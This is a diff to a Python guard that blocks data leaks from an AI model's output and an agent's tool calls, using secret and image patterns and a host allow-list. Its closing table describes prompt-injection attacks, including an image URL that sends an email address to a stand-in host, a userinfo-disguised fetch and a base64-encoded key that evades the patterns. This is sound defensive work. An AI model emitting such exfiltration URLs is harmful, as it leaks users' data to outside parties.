@@ -178,6 +178,8 @@ SECRET_PATTERNS = {
 }
 CANARY = re.compile(r"CANARY-[a-z]+-[0-9a-f]{4}")            # planted in confidential documents
 REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")    # markdown image => silent GET
+# inline images only: reference-style ![s][r] + "[r]: https://..." slips past, so the client's
+# CSP img-src (or a renderer with remote images off) is the real control; this is a backstop
 HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)                   # same channel if HTML is rendered
 ALLOWED_EGRESS = {"api.internal.example", "docs.example.com"}
 
@@ -200,8 +202,12 @@ def guard_completion(text: str) -> str:
 def guard_tool_call(name: str, args: dict) -> None:
     flat = " ".join(str(v) for v in args.values())
     scan_text(flat, f"arguments of {name}")
-    for host in re.findall(r"https?://([^/\s?#]+)", flat):
-        host = host.lower().rsplit("@", 1)[-1].split(":")[0]  # drop userinfo and port
+    for authority in re.findall(r"https?://([^/\s?#]+)", flat):
+        # refuse userinfo and backslashes outright: parsers disagree on the real host
+        # (urllib3 2.x, under requests, reads https://x.example\@docs.example.com/ as x.example)
+        if "@" in authority or "\\" in authority:
+            raise LeakBlocked(f"{name} URL has userinfo or a backslash: {authority}")
+        host = authority.lower().split(":")[0]                # drop the port
         if host not in ALLOWED_EGRESS:
             raise LeakBlocked(f"{name} would contact non-allow-listed host {host}")
 
@@ -227,7 +233,7 @@ if __name__ == "__main__":                      # the attacks from the table bel
 | Attack | What the guard does | Result |
 |---|---|---|
 | Injected document makes the model write `![s](https://x.example/p.png?d=jane@corp.example)` | `guard_completion` rewrites it to `[image removed: https://x.example/p.png]` | client never issues the GET; the query string never leaves |
-| Agent calls `fetch_url(url="https://docs.example.com@x.example/")` | userinfo is dropped, so the real host `x.example` is exposed | allow-list rejects it |
+| Agent calls `fetch_url(url="https://docs.example.com@x.example/")` | userinfo present; parsers disagree on the host | refused outright |
 | Raw AWS key (for example AWS's documented sample `AKIAIOSFODNN7EXAMPLE`) in a tool argument | secret pattern matches | blocked |
 | Model base64-encodes an AWS key into an argument to an allow-listed host | secret pattern misses it | only saved because the allow-listed host is one you control |
 
